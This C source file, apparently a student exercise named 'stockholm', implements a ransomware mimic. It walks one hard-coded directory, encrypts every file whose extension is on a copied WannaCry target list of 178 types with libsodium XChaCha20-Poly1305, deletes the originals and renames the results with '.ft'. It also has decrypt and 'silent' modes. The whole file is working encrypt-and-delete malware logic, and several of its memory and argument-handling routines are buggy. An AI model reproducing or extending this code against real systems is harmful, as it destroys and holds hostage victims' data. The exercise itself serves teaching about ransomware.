#include <string.h>
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <sodium.h>
#include <stdbool.h>
#include <bsd/string.h>

#define RED "\e[0;31m"
#define GRN "\e[0;32m"
#define WHT "\e[0;37m"
#define CYN "\e[0;36m"

#define CHUNK_SIZE 4096

char *ext[178] = {".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot",

    ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp",

    ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3",

    ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd",

    ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat",

    ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".rb",

    ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg",

    ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u",

    ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp",

    ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak",

    ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti",

    ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv",

    ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam",

    ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm",

    ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb",

    ".docx", ".doc"};

void close_file(FILE *fp_t, FILE *fp_s) {
    fclose(fp_t);
    fclose(fp_s);
}

void encrypt_file(const char *target_file, const char *source_file, const unsigned char *key) {

    crypto_secretstream_xchacha20poly1305_state st;
    FILE          *fp_t, *fp_s;
    unsigned char  buf_in[CHUNK_SIZE];
    unsigned char  buf_out[CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES];
    unsigned char  header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];
    unsigned char  tag;
    unsigned long long out_len;
    size_t         rlen;
    int            eof;

    fp_s = fopen(source_file, "rb");
    fp_t = fopen(target_file, "wb");
    if (!fp_s || !fp_t) {
        printf("Error: file open");
        return ;
    }
    crypto_secretstream_xchacha20poly1305_init_push(&st, header, key); // write header 
    fwrite(header, 1, sizeof header, fp_t);
    
    eof = feof(fp_s);
    while (!eof) {
        rlen = fread(buf_in, 1, sizeof(buf_in), fp_s);
        eof = feof(fp_s);
        tag = eof ? crypto_secretstream_xchacha20poly1305_TAG_FINAL : 0;
        crypto_secretstream_xchacha20poly1305_push(&st, buf_out, &out_len, buf_in, rlen, NULL, 0, tag);
        fwrite(buf_out, 1, (size_t)out_len, fp_t);
    }
    close_file(fp_t, fp_s);
    remove(source_file);
}

void decrypt_file(const char *target_file, const char *source_file, const unsigned char *key) {

    crypto_secretstream_xchacha20poly1305_state st;
    FILE          *fp_t, *fp_s;
    unsigned char  buf_in[CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES];
    unsigned char  buf_out[CHUNK_SIZE];
    unsigned char  header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];
    unsigned long long out_len;
    unsigned char  tag;
    size_t         rlen;
    int            eof;

    fp_s = fopen(source_file, "rb");
    fp_t = fopen(target_file, "wb");
    fread(header, 1, sizeof(header), fp_s);
    if (crypto_secretstream_xchacha20poly1305_init_pull(&st, header, key) != 0) {
        fprintf(stderr, "Error: incomplete header\n");
        goto close_ret;
    }
    eof = feof(fp_s);
    while (!eof) {
        rlen = fread(buf_in, 1, sizeof(buf_in), fp_s);
        eof = feof(fp_s);
        if (crypto_secretstream_xchacha20poly1305_pull(&st, buf_out, &out_len, &tag, buf_in, rlen, NULL, 0) != 0) {
            fprintf(stderr, "Error: corrupted chunk\n");
            goto close_ret;
        }
        if (tag == crypto_secretstream_xchacha20poly1305_TAG_FINAL && !eof) {
            fprintf(stderr, "Error: end of stream reached before the end of the file\n");    
            goto close_ret;
        } 
        else { // not the final chunk yet 
            if (tag != crypto_secretstream_xchacha20poly1305_TAG_FINAL && eof) {
                fprintf(stderr, "Error: end of file reached before the end of the stream\n");
                goto close_ret;
            }
        }
        fwrite(buf_out, 1, (size_t) out_len, fp_t);
    }
    close_ret:
        fclose(fp_t);
        fclose(fp_s);
        remove(source_file);
        return ; 
}

int check_key(char *key_file, char **key) {

    FILE* file = fopen(key_file, "r");
    if (!file) {
        fprintf(stderr, "Error: key file\n");
        return (-1);
    }

    fseek(file, 0, SEEK_END);
    int size_file = ftell(file);
    fseek(file, 0, SEEK_SET);

    char *data = malloc(sizeof(char*) * (size_file + 1));
    if (!data) {
        fclose(file);
        return (-1);
    }
    fread(data, 1, size_file, file);
    data[size_file] = '\0';

    *key = strdup(data);

    if (strlen(data) < 16) {
        fprintf(stderr, "Error: key size\n");
        free(data);
        fclose(file);
        return (-1);
    }
    free(data);
    fclose(file);
    return (1);
}


bool extension_is_ft(char *source) {

    char *target_extensions = strrchr(source, '.');
    if (strcmp(target_extensions, ".ft") == 0) {
            return (true);
        }
    return (false);
}

void    copy_path_file_for_encrypt(unsigned char *name, char **source, char **target) {

    *source = malloc(sizeof(char) * strlen(name) + 26);
    *target = malloc(sizeof(char) * strlen(name) + 26);
    strcpy(*source, "/home/yow/infection/");
    strcat(*source, name);

    strcpy(*target, "/home/yow/infection/");
    strcat(*target, name);
    strcat(*target, ".ft");
}

void    copy_path_file_for_decrypt(unsigned char *name, char **source, char **target) {
    
    *source = malloc(sizeof(char) * strlen(name) + 26);
    *target = malloc(sizeof(char) * strlen(name) + 26);
    strcpy(*source, "/home/yow/infection/");
    strcat(*source, name);

    strlcpy(*target, "/home/yow/infection/", strlen("/home/yow/infection/") + 1);
    char *str = strrchr(name, '.');
    if (str != NULL)
        *str = '\0';
    strcat(*target, name);
}

void    free_target_source(char *source, char *target) {
    if (target && source) {
        free(source);
        free(target);
        target = NULL;
        source = NULL;
    }
}



bool    is_wannacry_extension(char *name) {

    char *target_extensions = strrchr(name, '.');
    for (int i = 0; ext[i]; i++) {
        if (strcmp(ext[i], target_extensions) == 0) {
            return (true);
        }
    }
    return (false);
}

void infection(char *key, char **ext, char option) {

    DIR *directory = opendir("/home/yow/infection/"); /* /home/infection */
    struct dirent *dir;
    char *target = NULL;
    char *source = NULL;

    if (!directory) {
        fprintf(stderr, "Error: no such directory /home/infection\n");
        return ;
    }
    dir = readdir(directory);
    if (sodium_init() != 0) {
        return ;
    }
    while (dir != NULL) {
        
        if (dir->d_type != DT_DIR) {
            if (option == 'i') { // pas oublier de check l'extension du fichier
                if (is_wannacry_extension(dir->d_name) == false && extension_is_ft(dir->d_name) == false)
                    printf("%sError wannacry extension: %s%s\n", RED, CYN, dir->d_name);
                else {
                    copy_path_file_for_encrypt(dir->d_name, &source, &target);
                    if (extension_is_ft(source) == false) {
                        encrypt_file(target, source, key);
                        printf("%sSuccess: %s%s encrypted\n", GRN, CYN, source);
                    }
                    else
                        printf("%sError encryption for:  %s%s\n", RED, CYN, source);
                    free_target_source(source, target);
                }
            }
            else if (option == 'r') {
                copy_path_file_for_decrypt(dir->d_name, &source, &target);  
                if (extension_is_ft(source) == true) {
                    decrypt_file(target, source, key);
                    printf("%sSuccess: %s%s decrypted\n", GRN, CYN, source);
                }
                else 
                    printf("%sError: %s%s not decrypted\n", RED, CYN, source);
                free_target_source(source, target);
            }
            else if (option == 's' && is_wannacry_extension(dir->d_name) == true) {
                copy_path_file_for_encrypt(dir->d_name, &source, &target);
                if (extension_is_ft(source) == false)
                    encrypt_file(target, source, key);
                free_target_source(source, target);
            }
        }
        dir = readdir(directory);
    }
    closedir(directory);
}


int parse_arg(int argc, char **argv, char **key, char *option) {

    if (argc == 2 || argc == 3) {
        if (strcmp(argv[1], "-help") == 0 || strcmp(argv[1], "-h") == 0) {
            char *help = "./stockholm [OPTION] [KEY]\n./stockholm [KEY]\n[-v] print version\n[-r] decrypt file\n[-s] silence encrypt\n";
            printf("%s", help);
            return (-1);
        }
        else if (strcmp(argv[1], "-version") == 0 || strcmp(argv[1], "-v") == 0) {
            printf("Version: [0]\n");
            return (-1);
        }
        else if (argc == 2 && argv[1]) {
            *option = 'i';
            *key = strdup(argv[1]);
            return (1);
        }
        if (argv[2] && (strcmp(argv[1], "-reverse") == 0 || strcmp(argv[1], "-r") == 0)) {
            *option = 'r';
            *key = strdup(argv[2]);
        }
        else if (argv[2] && (strcmp(argv[1], "-silent") == 0 || strcmp(argv[1], "-s") == 0)) {
            *option = 's';
            *key = strdup(argv[2]);
        }
        else {
            fprintf(stderr, "Error: --help or -h\n");
            return (-1);
        }
    }
    else {
        fprintf(stderr, "Error: --help or -h\n");
        return (-1);   
    }
}

//-lsodium -lbsd
int main(int argc, char **argv) {

    char *key_file = NULL;
    char *key = NULL;
    char **ext = NULL;
    char option = 0;

    if (parse_arg(argc, argv, &key_file, &option) == -1) {
        return (1);
    }
    if (key_file) {
        if (check_key(key_file, &key) == -1) {
            goto free_key;
            return (-1);
        }
    }
    infection(key, ext, option);
    free_key:
        free(key);
        free(key_file);

    return (0);
}